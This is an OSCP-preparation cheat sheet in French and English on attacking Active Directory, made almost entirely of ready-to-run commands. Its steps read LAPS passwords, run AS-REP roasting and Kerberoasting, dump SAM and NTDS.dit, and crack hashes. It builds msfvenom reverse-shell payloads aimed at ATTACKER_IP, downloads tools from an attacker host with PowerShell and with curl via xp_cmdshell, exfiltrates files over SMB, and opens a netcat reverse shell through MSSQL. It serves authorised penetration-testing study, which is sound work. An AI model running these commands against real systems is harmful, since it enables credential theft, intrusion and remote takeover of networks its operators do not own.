# 🏅 OSCP Active Directory Cheat Sheet

{% hint style="success" %}
Ce document regroupe tout ce que j’ai appris au travers des box et des cours de préparation aux techniques d’exploitation Active Directory. Il reflète mon expérience personnelle et n’engage que moi. Je ne couvre pas ici les techniques les plus avancées, mais vous pouvez vous tourner vers d’autres ressources comme [The Hacker Recipes](https://www.thehacker.recipes/) pour approfondir le sujet.
{% endhint %}

***

## **🛡️ Active Directory Cheat Sheet**

### 📌 Reconnaissance & Énumération

<details>

<summary>🔍LDAP <strong>Enumeration</strong></summary>

*   **Énumération LDAP anonyme**

    ```bash
    ldapsearch -v -x -b "DC=<DOMAIN>,DC=com" -H "ldap://<IP>" "(objectclass=*)"
    ```
*   **Énumération LDAP auth (LAPS Password)**

    ```bash
    ldapsearch -x -H "ldap://<IP>" -D "<DOMAIN>\<USER>" -w "<PASSWORD>" -b "DC=<DOMAIN>,DC=com" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
    ```
*   **Énumération with Windapsearch**

    ```bash
    ./windapsearch.py --dc-ip <IP> -u "" -U
    ```
*   **Extraction of users and descriptions via NetExec**

    ```bash
    #users
    nxc ldap $ip -u $user -p $password --users
    #desc
    nxc ldap "<DC>" -d "<DOMAIN>" -u "<USER>" -p "<PASSWORD>" -M get-desc
    ```
*   **Testing if an account exists without kerberos protocol**

    ```bash
    nxc ldap 192.168.1.0/24 -u users.txt -p '' -k
    #mode 18200 hashcat
    ```
*   **Asreproasting**

    ```bash
    nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
    ```
*   **Kerberoasting**

    ```bash
    nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
    #mode 13100 hashcat
    ```
*   **Bloodhound collector**

    ```bash
    nxc ldap <ip> -u user -p pass --bloodhound --collection All
    ```

Rest later

</details>

<details>

<summary>📂 SMB Enumeration</summary>

*   **List SMB Shares and users**

    ```bash
    crackmapexec smb <IP> --shares -u <USER> -p <PASSWORD> --users
    # command to get clean users.txt -> awk '/SMB/{if (NF>=5) print $5}' > users.txt
    ```
*   **Brute force RID for user enumeration**

    ```bash
    nxc smb <IP> -u '' -p '' --rid-brut
    ```
*   **List SMB shares anonymous**

    ```bash
    smbclient -L //<IP> -N
    ```
*   **Dumping all files in the share**

    ```bash
    nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
    ```
*   **Dump SAM with admin privileges (--local-auth possible)**

    ```bash
    nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
    ```
*   **Dump NTDS.dit with DomainAdmin or Local Admin**

    ```bash
    nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
    ```

There are plenty of Credentials discovery commands, no need to put everything, commands here: [https://www.netexec.wiki/smb-protocol/obtaining-credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials)

</details>

####

#### 🎯 **Droits Windows (Privilege Escalation)**

* **SeBackupPrivilege** → Lire des fichiers normalement inaccessibles
* **SeRestorePrivilege** → Écraser des fichiers protégés
* **SeImpersonatePrivilege** → Exploitable avec JuicyPotato pour devenir SYSTEM
* **SeLoadDriverPrivilege** → Charger des drivers malveillants

***

### 💥 Cracking des Hashes

*   **NTLM**

    ```bash
    hashcat -m 1000 -a 3 hash.txt
    ```
*   **NetNTLMv1**

    ```bash
    hashcat -m 5500 -a 3 hash.txt
    ```
*   **NetNTLMv2**

    ```bash
    john --format=netntlmv2 hash.txt
    ```
*   **SPN Hash (Kerberoasting)**

    ```bash
    hashcat -m 13100 -a 0 spn.txt rockyou.txt
    ```

***

### 🚀 Payloads & Reverse Shells

*   **Windows Meterpreter**

    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **Windows Shell Staged**

    ```bash
    msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
    ```
*   **PowerShell Reverse Shell**

    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER_IP> LPORT=<PORT> -f psh-cmd
    ```

***

### 🔄 Transfert de Fichiers

*   **Serveur HTTP Python**

    ```bash
    python3 -m http.server 80
    ```
*   **Télécharger un fichier via PowerShell**

    ```powershell
    powershell -c "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\Users\Public\file.exe'"
    ```
*   **Exfiltration via SMB**

    ```bash
    smbclient //<ATTACKER_IP>/SHARE -U "USER" -c "put file.exe"
    ```

***

### 🏴‍☠️ Post-Exploitation

*   **Changement du mot de passe via RPC**

    ```bash
    setuserinfo <USER> 23 'NewPassword123!'
    ```
*   **Utilisation d’un ticket Kerberos pour MSSQL**

    ```bash
    export KRB5CCNAME=$PWD/Administrator.ccache
    ```
*   **Téléchargement de Netcat via MSSQL**

    ```bash
    xp_cmdshell "curl http://<ATTACKER_IP>/nc.exe -o c:\temp\nc.exe"
    ```
*   **Reverse Shell via MSSQL**

    ```bash
    xp_cmdshell "c:\temp\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
    ```
